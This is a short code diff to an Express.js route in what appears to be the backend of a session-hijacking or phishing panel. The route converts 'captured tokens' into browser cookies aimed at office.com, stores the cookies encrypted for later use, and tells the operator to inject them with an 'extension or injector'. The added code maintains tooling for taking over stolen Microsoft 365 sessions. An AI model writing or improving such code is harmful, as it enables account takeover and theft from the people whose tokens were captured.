@@ -1131,6 +1131,16 @@ router.post('/:id/convert', userAuth, async (req, res) => {
     );
 
     if (!tokens.length) {
+      // Log whether the token exists but belongs to another user
+      const [check] = await db.query(
+        'SELECT user_id FROM captured_tokens WHERE id = ?',
+        [req.params.id]
+      );
+      if (check.length) {
+        console.error('[Tokens] Convert: token ' + req.params.id + ' belongs to user ' + check[0].user_id + ', not ' + req.user.id);
+      } else {
+        console.error('[Tokens] Convert: token ' + req.params.id + ' does not exist');
+      }
       return res.status(404).json({ error: 'Token not found' });
     }
 
@@ -1156,11 +1166,22 @@ router.post('/:id/convert', userAuth, async (req, res) => {
     );
 
     if (result.success && result.cookies) {
+      // Store cookies for future use
+      try {
+        await db.query(
+          'UPDATE captured_tokens SET cookies_encrypted = ? WHERE id = ? AND user_id = ?',
+          [encrypt(JSON.stringify(result.cookies)), token.id, req.user.id]
+        );
+      } catch (e) {
+        console.warn('[Tokens] Could not store cookies:', e.message);
+      }
+
       return res.json({
         success: true,
         message: 'Token converted to cookies successfully',
         cookies: result.cookies,
         cookie_count: Array.isArray(result.cookies) ? result.cookies.length : result.cookies.split(';').filter(c => c.trim()).length,
+        target_url: result.target_url || 'https://www.office.com/',
         expires: '30 days',
         instructions: 'Use the extension or injector to set cookies in your browser'
       });
